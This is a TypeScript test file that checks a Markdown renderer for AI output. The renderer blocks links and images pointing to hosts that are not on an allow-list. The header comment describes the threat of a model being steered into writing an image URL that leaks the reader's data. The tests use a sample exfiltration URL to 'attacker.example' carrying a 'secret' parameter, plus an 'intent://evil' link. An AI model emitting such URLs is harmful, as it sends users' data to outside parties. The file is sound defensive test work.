/**
 * Model-written Markdown loads no image from a host it was not given:
 * an image URL fetches on render, so text the model was steered into
 * writing could otherwise send the reader's address anywhere.
 */

import { describe, expect, it, vi } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";

vi.mock("katex/dist/katex.min.css", () => ({}));

const { Markdown } = await import("../base/ui/ai-markdown/ai-markdown");

const render = (
  text: string,
  imagePrefixes?: string[],
  linkPrefixes?: string[]
) =>
  renderToStaticMarkup(
    <Markdown imagePrefixes={imagePrefixes} linkPrefixes={linkPrefixes}>
      {text}
    </Markdown>
  );

// Streamdown renders a link it keeps as a button that confirms before it
// opens, and one the policy refuses as text marked "[blocked]".
const LINKED = 'data-streamdown="link"';
const BLOCKED = "[blocked]";

describe("Markdown links", () => {
  it("keeps an http(s) link by default, and blocks a custom scheme", () => {
    expect(render("[docs](https://docs.example.com/a)")).toContain(LINKED);
    const custom = render("[open](intent://evil#Intent;end)");
    expect(custom).toContain(BLOCKED);
    expect(custom).not.toContain(LINKED);
  });

  it("links only to the hosts a product names, when it names them", () => {
    const allowed = ["https://docs.example.com/"];
    expect(render("[ok](https://docs.example.com/a)", [], allowed)).toContain(
      LINKED
    );
    const elsewhere = render(
      "[apply](https://elsewhere.example/apply)",
      [],
      allowed
    );
    expect(elsewhere).toContain(BLOCKED);
    expect(elsewhere).not.toContain(LINKED);
  });
});

describe("Markdown images", () => {
  it("does not load an image from an arbitrary host", () => {
    const html = render("![x](https://attacker.example/p?d=secret)");
    expect(html).not.toContain('src="https://attacker.example');
  });

  it("loads one from a host the product allows", () => {
    const html = render("![logo](https://cdn.example.com/logo.png)", [
      "https://cdn.example.com/",
    ]);
    expect(html).toContain('src="https://cdn.example.com/logo.png"');
  });

  it("keeps ordinary links", () => {
    const html = render("[docs](https://docs.example.com)");
    expect(html).toContain('data-streamdown="link"');
    expect(html).toContain("docs");
  });
});
